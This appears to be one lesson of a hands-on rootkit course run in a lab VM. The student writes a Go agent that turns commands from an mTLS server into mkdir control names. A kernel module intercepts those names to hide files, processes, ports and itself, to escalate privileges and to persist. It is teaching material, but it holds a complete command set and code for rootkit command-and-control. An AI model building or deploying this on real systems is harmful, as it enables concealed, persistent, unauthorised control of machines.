# L16: mkdir Bridge

Translate authenticated operator commands into the module's mkdir control names,
then use the same channel to read its live in-memory state.
The agent remains userspace-only; the provided M01 module performs the kernel
action.

L15 connects the agent to the server.
But it just reads one line and exits.
The kernel module listens for mkdir commands.
The agent needs to translate server instructions into mkdir calls.

## Workspace

```text
exercises/L16-mkdir-bridge
├── go.mod
├── go.sum
└── main.go
```

Only `main.go` is editable.
The runner builds the M01 reference module, loads it, then starts your agent.

## The bridge pattern

The server speaks human-readable commands.
The kernel module speaks mkdir names.
The agent translates between them.

```text
  Server                  Agent                  Kernel
    |                       |                       |
    |-- "HIDE FILE x" ---->|                       |
    |                       |-- os.Mkdir            |
    |                       |   "rklings.h.f.x"    |
    |                       |                  [kretprobe]
    |                       |                  target_add("x")
    |                       |                       |
    |-- "INFO" ----------->|                       |
    |                       |-- mkdir syscall ------>|
    |                       |   "rklings.info"      |
    |                       |<-- state in buffer ----|
    |<-- "INFO ..." -------|                       |
```

## Command mapping

The server sends one command per line.
The agent maps each to a mkdir name:

```text
Server command             mkdir name
--------------             ----------
PING                       rklings.ping
STATUS                     rklings.status
INFO                       rklings.info, with a response in the input buffer
ESCALATE                   rklings.e
ESCALATE <pid>             rklings.e.<pid>
PERSIST                    rklings.persist
UNPERSIST                  rklings.unpersist
HIDE MODULE                rklings.h.m
UNHIDE MODULE              rklings.u.m
HIDE FILE <name>           rklings.h.f.<name>
UNHIDE FILE <name>         rklings.u.f.<name>
HIDE PID <pid>             rklings.h.i.<pid>
UNHIDE PID <pid>           rklings.u.i.<pid>
HIDE CONTENT <str>         rklings.h.c.<str>
UNHIDE CONTENT <str>       rklings.u.c.<str>
HIDE PORT <port>           rklings.h.p.<port>
UNHIDE PORT <port>         rklings.u.p.<port>
QUIT                       rklings.quit
```

## os.Mkdir

Go's `os.Mkdir` issues the mkdir syscall.
The kernel module's kretprobe intercepts it before the real mkdir runs.
The directory is never created.
The command is dispatched.

```go
err := os.Mkdir("rklings.h.f.secret.txt", 0)
```

The permission mode does not matter because the kernel control consumes the
matching request before a directory remains on disk.
Use 0 for clarity.

## Reading state through the same syscall

Most control names only need a success or error result. `rklings.info` is
bidirectional: the agent passes a writable pathname buffer, and the module
replaces its contents with a snapshot of the state it already keeps in memory.

```text
before syscall              after syscall
+----------------------+    +-----------------------------+
| rklings.info\0       |    | module_hidden=1\n           |
| remaining capacity   | -> | file=secret.txt\n           |
|                      |    | port=8443\n\0               |
+----------------------+    +-----------------------------+
```

The syscall return value is the response length. `os.Mkdir` discards a
successful return value, so use `unix.Syscall(unix.SYS_MKDIR, ...)` for this one
command.
The buffer is caller-owned memory; no procfs file, device, socket, or second
ledger is created.

## Command loop

The agent reads lines in a loop until the server closes the connection or sends
QUIT:

```go
scanner := bufio.NewScanner(conn)
for scanner.Scan() {
    line := scanner.Text()
    if line == "INFO" {
        state, err := queryKernelState()
        // Return state to the server.
        continue
    }
    os.Mkdir(translate(line), 0)
}
```

## Implement it

Complete `main.go`:

- mTLS setup (reuse the provided L15 pattern)
- `translate(line string) string`: map server command to mkdir name
- `queryKernelState()`: issue `rklings.info` with a writable buffer
- Command loop: read lines, translate, os.Mkdir

## Useful interfaces

```go
import "os"

import "golang.org/x/sys/unix"

// Issue mkdir syscall (intercepted by kernel module)
err := os.Mkdir(name, 0)

// Preserve the buffer until the raw syscall has returned.
runtime.KeepAlive(buffer)

// Split command line
parts := strings.SplitN(line, " ", 3)
// parts[0] = verb, parts[1] = target type, parts[2] = argument
```

## Test it

Start the independent lab server in one host terminal:

```sh
./rklings serve L16
```

Build and boot the target in another:

```sh
./rklings run L16
```

The kernel module is loaded in the VM and the agent connects to the host.
Create a visible target in the VM:

```sh
printf 'this file still exists\n' >/tmp/secret.txt
ls /tmp/secret.txt
```

Open `http://127.0.0.1:8080` and send:

```
HIDE FILE secret.txt
```

In the VM:

```
root@vm:~# ls /tmp/
(secret.txt is not listed)
root@vm:~# cat /tmp/secret.txt
this file still exists
```

The file disappears from `ls` but remains directly accessible.
The agent translated the server command to `mkdir rklings.h.f.secret.txt`, and
the kernel module hid it.

Stop `run` and `serve` with `Ctrl+C` when finished.

## Validate

```
$ ./rklings validate L16
  [+] agent binary builds
  [+] module loaded
  [+] agent connects to mTLS server
  [+] HIDE FILE command hides file from ls
  [+] hidden file still readable via cat
  [+] INFO returns the live in-memory target ledger
  [+] multiple commands processed in sequence
  PASS
```

## Next

One remote action works, but every action is still hardcoded.
L17 lets the operator choose commands such as status, concealment, persistence,
and escalation over the existing connection.
